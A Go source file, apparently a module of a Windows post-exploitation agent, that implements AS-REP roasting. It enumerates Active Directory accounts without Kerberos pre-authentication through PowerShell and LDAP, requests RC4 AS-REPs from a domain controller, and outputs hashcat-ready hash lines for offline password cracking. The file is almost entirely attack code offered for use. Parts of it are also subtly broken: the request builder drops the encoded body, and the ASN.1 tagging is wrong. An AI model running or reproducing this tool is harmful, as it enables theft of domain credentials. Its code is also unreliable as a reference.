//go:build windows
// +build windows

package main

import (
	"crypto/rand"
	"encoding/asn1"
	"encoding/hex"
	"fmt"
	"math/big"
	"net"
	"strings"
	"time"
)

// asrepRoast enumerates (or accepts) accounts with the DONT_REQ_PREAUTH
// (UF_DONT_REQUIRE_PREAUTH = 0x400000) flag and sends an AS-REQ WITHOUT
// PA-ENC-TIMESTAMP pre-authentication to each. The DC returns an AS-REP whose
// encrypted client key (enc-part) can be cracked offline with hashcat -m 18200.
//
// args is an optional comma/space separated list of sAMAccountNames. When empty,
// the agent enumerates DONT_REQ_PREAUTH accounts in the current domain via LDAP.
func asrepRoast(args string) (string, error) {
	// Resolve the current domain/realm.
	domain, err := currentDomainFQDN()
	if err != nil {
		return "", fmt.Errorf("asreproast: %w", err)
	}
	realm := strings.ToUpper(domain)

	// Resolve a DC to talk to (Kerberos runs on :88).
	dcHost, err := resolveDC(domain)
	if err != nil {
		return "", fmt.Errorf("asreproast: cannot resolve DC: %w", err)
	}

	var users []string
	if strings.TrimSpace(args) != "" {
		for _, u := range strings.FieldsFunc(args, func(r rune) bool {
			return r == ',' || r == ' ' || r == '\n' || r == '\t'
		}) {
			users = append(users, strings.TrimSpace(u))
		}
	} else {
		users, err = enumerateDontReqPreauth()
		if err != nil {
			return "", fmt.Errorf("asreproast: enumerate preauth-disabled accounts: %w", err)
		}
	}
	if len(users) == 0 {
		return "asreproast: no accounts without pre-authentication found", nil
	}

	var out strings.Builder
	for _, user := range users {
		hash, herr := asrepRoastUser(dcHost, realm, user)
		if herr != nil {
			out.WriteString(fmt.Sprintf("[!] %s: %v\n", user, herr))
			continue
		}
		out.WriteString(hash)
		out.WriteString("\n")
	}
	return out.String(), nil
}

// currentDomainFQDN returns the AD domain the host is joined to.
func currentDomainFQDN() (string, error) {
	ps := `$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); Write-Output $d.Name`
	out, err := runShell(ps, "powershell.exe")
	if err != nil {
		return "", err
	}
	name := strings.TrimSpace(out)
	if name == "" {
		return "", fmt.Errorf("empty domain")
	}
	return name, nil
}

// resolveDC finds a domain controller via the _kerberos._tcp.<domain> SRV record.
func resolveDC(domain string) (string, error) {
	_, addrs, err := net.LookupSRV("kerberos", "tcp", domain)
	if err == nil && len(addrs) > 0 {
		return strings.TrimSuffix(addrs[0].Target, "."), nil
	}
	// Fallback: try the domain name itself (often round-robins to a DC).
	if _, err2 := net.LookupHost(domain); err2 == nil {
		return domain, nil
	}
	return "", fmt.Errorf("SRV lookup failed: %v", err)
}

// enumerateDontReqPreauth returns sAMAccountNames of accounts with
// UF_DONT_REQUIRE_PREAUTH set (userAccountControl & 0x400000).
func enumerateDontReqPreauth() ([]string, error) {
	ps := `
$ErrorActionPreference='Stop';
$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();
$root="LDAP://"+$d;
$de=New-Object System.DirectoryServices.DirectoryEntry($root);
$ds=New-Object System.DirectoryServices.DirectorySearcher($de);
$ds.Filter="(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
$ds.PropertiesToLoad.Add("sAMAccountName") | Out-Null;
$ds.PageSize=1000;
$res=@();
foreach($u in $ds.FindAll()){ $res += $u.Properties["samaccountname"][0] };
Write-Output ($res -join [Environment]::NewLine);
`
	out, err := runShell(ps, "powershell.exe")
	if err != nil {
		return nil, err
	}
	var names []string
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(strings.Trim(line, "\r"))
		if line != "" {
			names = append(names, line)
		}
	}
	return names, nil
}

// --- Minimal RFC 4120 ASN.1 structures for AS-REQ / AS-REP ---

type paData struct {
	PadataType  int    `asn1:"tag:1"`
	PadataValue []byte `asn1:"tag:2"`
}

type principalName struct {
	NameType   int      `asn1:"tag:0"`
	NameString []string `asn1:"tag:1"`
}

type kdcReqBody struct {
	KDCOptions []byte         `asn1:"tag:0"`
	CName      principalName  `asn1:"tag:1,optional"`
	Realm      string         `asn1:"tag:2"`
	SName      principalName  `asn1:"tag:3,optional"`
	Till       time.Time      `asn1:"tag:5,generalized"`
	Nonce      int            `asn1:"tag:7"`
	EType      []int          `asn1:"tag:8"`
}

type kdcReq struct {
	Pvno    int          `asn1:"tag:1"`
	MsgType int          `asn1:"tag:2"`
	Padata  []paData     `asn1:"tag:3,optional"`
	ReqBody kdcReqBody   `asn1:"tag:4"`
}

type encryptedData struct {
	EType  int    `asn1:"tag:0"`
	Kvno   int    `asn1:"tag:1,optional"`
	Cipher []byte `asn1:"tag:2"`
}

type kdcRep struct {
	Pvno    int           `asn1:"tag:1"`
	MsgType int           `asn1:"tag:2"`
	Padata  []paData      `asn1:"tag:3,optional"`
	CRealm  string        `asn1:"tag:4"`
	CName   principalName `asn1:"tag:5"`
	Ticket  asn1.RawValue `asn1:"tag:6"`
	EncPart encryptedData `asn1:"tag:7"`
}

// asrepRoastUser builds an AS-REQ with no PA-ENC-TIMESTAMP and parses the AS-REP
// into a hashcat -m 18200 hash line.
func asrepRoastUser(dcHost, realm, user string) (string, error) {
	req, err := buildASREQ(realm, user)
	if err != nil {
		return "", err
	}

	asrep, err := sendKRBMessage(dcHost, req)
	if err != nil {
		return "", err
	}
	rep, err := parseASREP(asrep)
	if err != nil {
		return "", err
	}

	// AS-REP roast hash format: $krb5asrep$<etype>$<user>@<realm>:<cipher-hex>
	uname := user
	if len(rep.CName.NameString) > 0 {
		uname = rep.CName.NameString[0]
	}
	hash := fmt.Sprintf("$krb5asrep$%d$%s@%s:%s",
		rep.EncPart.EType, uname, strings.ToUpper(rep.CRealm),
		hex.EncodeToString(rep.EncPart.Cipher))
	return hash, nil
}

func buildASREQ(realm, user string) ([]byte, error) {
	// KDCOptions: forwardable(1), proxiable(2), renewable(8), canonicalize(15)
	kdcOpts := []byte{0x60, 0x81, 0x00, 0x00}

	nonce, err := rand.Int(rand.Reader, big.NewInt(0x7fffffff))
	if err != nil {
		return nil, err
	}

	// PA-PAC-REQUEST (include PAC = true): A0 03 01 01 FF
	pac := []byte{0xA0, 0x03, 0x01, 0x01, 0xFF}

	req := kdcReq{
		Pvno:    5,
		MsgType: 10, // AS-REQ
		Padata: []paData{
			{PadataType: 128, PadataValue: pac},
		},
		ReqBody: kdcReqBody{
			KDCOptions: kdcOpts,
			CName:      principalName{NameType: 1, NameString: []string{user}},
			Realm:      realm,
			SName:      principalName{NameType: 2, NameString: []string{"krbtgt", realm}},
			Till:       time.Now().Add(10 * time.Minute).UTC(),
			Nonce:      int(nonce.Int64()) + 1,
			EType:      []int{23}, // RC4-HMAC (hashcat -m 18200)
		},
	}

	body, err := asn1.Marshal(req)
	if err != nil {
		return nil, fmt.Errorf("marshal AS-REQ: %w", err)
	}
	// Wrap as [APPLICATION 10] (tag 0x6E) constructed.
	return append([]byte{0x6E}, derLength(len(body))...), nil
}

// derLength encodes a DER definite length.
func derLength(n int) []byte {
	if n < 0x80 {
		return []byte{byte(n)}
	}
	var tmp [8]byte
	i := 0
	for n > 0 {
		tmp[i] = byte(n & 0xff)
		n >>= 8
		i++
	}
	return append([]byte{byte(0x80 | i)}, reverse(tmp[:i])...)
}

func reverse(b []byte) []byte {
	for i, j := 0, len(b)-1; i < j; i, j = i+1, j-1 {
		b[i], b[j] = b[j], b[i]
	}
	return b
}

// sendKRBMessage sends a Kerberos message to host:88 over TCP (4-byte length
// prefix) and returns the response bytes.
func sendKRBMessage(host string, msg []byte) ([]byte, error) {
	addr := net.JoinHostPort(host, "88")
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return nil, fmt.Errorf("dial %s: %w", addr, err)
	}
	defer conn.Close()

	lenPrefix := []byte{byte(len(msg) >> 24), byte(len(msg) >> 16), byte(len(msg) >> 8), byte(len(msg))}
	if _, err := conn.Write(append(lenPrefix, msg...)); err != nil {
		return nil, fmt.Errorf("write: %w", err)
	}

	hdr := make([]byte, 4)
	if err := readFull(conn, hdr); err != nil {
		return nil, fmt.Errorf("read length: %w", err)
	}
	respLen := int(hdr[0])<<24 | int(hdr[1])<<16 | int(hdr[2])<<8 | int(hdr[3])
	if respLen <= 0 || respLen > 64*1024*1024 {
		return nil, fmt.Errorf("invalid response length %d", respLen)
	}
	resp := make([]byte, respLen)
	if err := readFull(conn, resp); err != nil {
		return nil, fmt.Errorf("read body: %w", err)
	}
	return resp, nil
}

func readFull(conn net.Conn, buf []byte) error {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		if n > 0 {
			total += n
		}
		if err != nil {
			return err
		}
		if n == 0 {
			return fmt.Errorf("short read")
		}
	}
	return nil
}

// parseASREP strips the [APPLICATION 11] (0x6B) wrapper and decodes the KDC-REP.
func parseASREP(data []byte) (*kdcRep, error) {
	if len(data) < 2 || data[0] != 0x6B {
		return nil, fmt.Errorf("not an AS-REP (tag=0x%02x)", data[0])
	}
	// Skip the outer application tag + DER length to reach the SEQUENCE content.
	_, rest, err := readTLV(data[1:])
	if err != nil {
		return nil, err
	}
	var rep kdcRep
	if _, err := asn1.Unmarshal(rest, &rep); err != nil {
		return nil, fmt.Errorf("unmarshal AS-REP: %w", err)
	}
	return &rep, nil
}

// readTLV returns (headerLen, content, error) skipping one TLV's tag+length.
func readTLV(b []byte) (int, []byte, error) {
	if len(b) < 1 {
		return 0, nil, fmt.Errorf("empty")
	}
	idx := 1
	if b[0]&0x1f == 0x1f {
		// multi-byte tag (not expected here, but handle gracefully)
		for idx < len(b) && b[idx]&0x80 != 0 {
			idx++
		}
		idx++
	}
	if idx >= len(b) {
		return 0, nil, fmt.Errorf("truncated length")
	}
	first := b[idx]
	idx++
	if first < 0x80 {
		return idx, b[idx : idx+int(first)], nil
	}
	numBytes := int(first & 0x7f)
	if idx+numBytes > len(b) {
		return 0, nil, fmt.Errorf("truncated length bytes")
	}
	length := 0
	for i := 0; i < numBytes; i++ {
		length = length<<8 | int(b[idx+i])
	}
	idx += numBytes
	if idx+length > len(b) {
		return 0, nil, fmt.Errorf("length exceeds buffer")
	}
	return idx, b[idx : idx+length], nil
}
